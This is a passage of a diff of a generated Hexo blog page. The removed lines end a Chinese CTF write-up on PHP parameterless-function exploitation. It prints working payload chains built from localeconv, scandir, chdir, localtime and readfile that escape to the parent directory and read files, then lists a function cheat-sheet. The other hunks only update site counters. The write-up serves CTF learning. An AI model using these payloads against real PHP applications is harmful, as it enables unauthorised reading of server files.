-next() 函数将内部指针指向数组中的下一个元素，并输出。 这里可以获取到scandir()返回的&quot;..&quot;</code></pre>
-<p>那么构造payload,j就可以跳转到上一目录了，大师chidr并不会返回目录列表,而是会返回一个bool值，我们怎么去读取文件呢:</p>
-<pre><code class="php">chdir(next(scandir(pos(localeconv()))))</code></pre>
-<p>这里可以使用if()语句，也就是当跳转目录成功时候就读取当前文件。构造如下payload:</p>
-<pre><code class="php">if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))))</code></pre>
-<ol start="2">
-<li>当然还有另外的方法，利用当前秒数构造AIISC码再用<code>chr()</code>去转码生成字符。</li>
-</ol>
-<pre><code class="php">chr(pos(localtime()))</code></pre>
-<p>这里出现了一个问题，这个<code>localtime()</code>只接受时间戳，那么这里又出现了其问题如果构造如下payload将无法执行。那么这里还需要不受参数影响的函数，那就<code>time()</code></p>
-<pre><code class="php">chr(pos(localtime(chdir(next(scandir(pos(localeconv())))))))</code></pre>
-<p>那么可以构造如下payload:</p>
-<pre><code class="php">chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))</code></pre>
-<p>整体构造：</p>
-<pre><code class="php">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</code></pre>
-<h3 id="无参数函数小总结"><a href="#无参数函数小总结" class="headerlink" title="无参数函数小总结"></a>无参数函数小总结</h3><p>这里是针对无参数函数利用来说的。</p>
-<pre><code class="php">getchwd() 函数返回当前工作目录。
-scandir() 函数返回指定目录中的文件和目录的数组。
-dirname() 函数返回路径中的目录部分。
-chdir() 函数改变当前的目录。
-
-readfile()  输出一个文件
-
-current()       返回数组中的当前单元, 默认取第一个值
-pos()           current() 的别名
-next() 函数将内部指针指向数组中的下一个元素，并输出。
-end()       将内部指针指向数组中的最后一个元素，并输出。
-array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
-array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
-
-chr() 函数从指定的 ASCII 值返回字符。
-hex2bin — 转换十六进制字符串为二进制字符串
-
-getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)</code></pre>
-<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a herf="https://xz.aliyun.com/t/6316#toc-9">ByteCTF一道题的分析与学习PHP无参数函数的利用</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -3303,7 +3191,7 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">64</span>
+          <span class="site-state-item-count">65</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -3316,7 +3204,7 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">15</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -3374,12 +3262,12 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">231k</span>
+    <span title="站点总字数">235k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:30</span>
+    <span title="站点阅读时长">3:33</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
